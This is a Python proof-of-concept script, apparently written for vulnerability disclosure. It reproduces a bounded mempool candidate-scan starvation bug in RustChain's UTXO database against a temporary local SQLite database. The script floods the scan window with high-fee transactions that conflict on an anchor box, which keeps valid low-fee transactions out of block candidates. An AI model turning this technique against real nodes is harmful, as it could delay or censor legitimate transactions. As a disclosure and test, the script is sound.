#!/usr/bin/env python3
"""Local PoC for RustChain bounded mempool candidate-scan starvation.

This script creates a temporary SQLite database and imports `node/utxo_db.py`
from a local RustChain checkout. It does not contact the live network.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import sys
import tempfile
import time
from pathlib import Path


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--repo",
        type=Path,
        required=True,
        help="Path to a Scottcjn/Rustchain checkout",
    )
    parser.add_argument("--max-count", type=int, default=2)
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    node_dir = (args.repo / "node").resolve()
    if not (node_dir / "utxo_db.py").is_file():
        raise SystemExit(f"utxo_db.py not found under {node_dir}")
    if args.max_count < 1:
        raise SystemExit("--max-count must be positive")

    sys.path.insert(0, str(node_dir))
    from utxo_db import (  # pylint: disable=import-error,import-outside-toplevel
        MAX_MEMPOOL_CANDIDATE_SCAN_FACTOR,
        UtxoDB,
        address_to_proposition,
        compute_box_id,
    )

    box_value = 1_000_000
    window = args.max_count * MAX_MEMPOOL_CANDIDATE_SCAN_FACTOR

    with tempfile.TemporaryDirectory() as temp_dir:
        db = UtxoDB(str(Path(temp_dir) / "node.db"))
        db.init_tables()

        def seed_box(label: str) -> str:
            transaction_id = hashlib.sha256(f"seed:{label}".encode()).hexdigest()
            proposition = address_to_proposition(f"owner-{label}")
            box_id = compute_box_id(
                box_value,
                proposition,
                1,
                transaction_id,
                0,
            )
            db.add_box(
                {
                    "box_id": box_id,
                    "value_nrtc": box_value,
                    "proposition": proposition,
                    "owner_address": f"owner-{label}",
                    "creation_height": 1,
                    "transaction_id": transaction_id,
                    "output_index": 0,
                    "tokens_json": "[]",
                    "registers_json": "{}",
                }
            )
            return box_id

        def add_transaction(
            label: str,
            box_id: str,
            fee: int,
            data_inputs: list[str] | None = None,
        ) -> str:
            transaction_id = hashlib.sha256(
                f"mempool:{label}".encode()
            ).hexdigest()
            transaction = {
                "tx_id": transaction_id,
                "tx_type": "transfer",
                "inputs": [{"box_id": box_id}],
                "outputs": [
                    {
                        "address": f"recipient-{label}",
                        "value_nrtc": box_value - fee,
                    }
                ],
                "fee_nrtc": fee,
                "timestamp": int(time.time()),
            }
            if data_inputs:
                transaction["data_inputs"] = data_inputs
            assert db.mempool_add(transaction), f"mempool rejected {label}"
            return transaction_id

        anchor_box = seed_box("anchor")
        anchor_transaction = add_transaction("anchor", anchor_box, fee=10_000)

        conflict_transaction_ids = []
        for index in range(window - 1):
            conflict_transaction_ids.append(
                add_transaction(
                    f"conflict-{index}",
                    seed_box(f"conflict-{index}"),
                    fee=9_999 - index,
                    data_inputs=[anchor_box],
                )
            )

        low_transaction_ids = []
        for index in range(args.max_count):
            low_transaction_ids.append(
                add_transaction(
                    f"low-{index}",
                    seed_box(f"low-{index}"),
                    fee=max(0, args.max_count - index - 1),
                )
            )

        candidates_before = db.mempool_get_block_candidates(args.max_count)
        before_ids = [transaction["tx_id"] for transaction in candidates_before]
        assert before_ids == [anchor_transaction], before_ids

        for transaction_id in conflict_transaction_ids:
            db.mempool_remove(transaction_id)

        candidates_after = db.mempool_get_block_candidates(args.max_count)
        after_ids = [transaction["tx_id"] for transaction in candidates_after]
        assert len(after_ids) == args.max_count, after_ids
        assert anchor_transaction in after_ids, after_ids
        assert any(item in after_ids for item in low_transaction_ids), after_ids

        report = {
            "max_count": args.max_count,
            "scan_factor": MAX_MEMPOOL_CANDIDATE_SCAN_FACTOR,
            "scan_window": window,
            "high_fee_rows": window,
            "valid_low_fee_rows_beyond_window": len(low_transaction_ids),
            "candidates_before_removing_conflicts": before_ids,
            "candidate_count_before": len(before_ids),
            "candidate_count_after_control": len(after_ids),
            "classification": "bounded_candidate_scan_starvation",
            "reproduced": True,
        }
        print(json.dumps(report, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
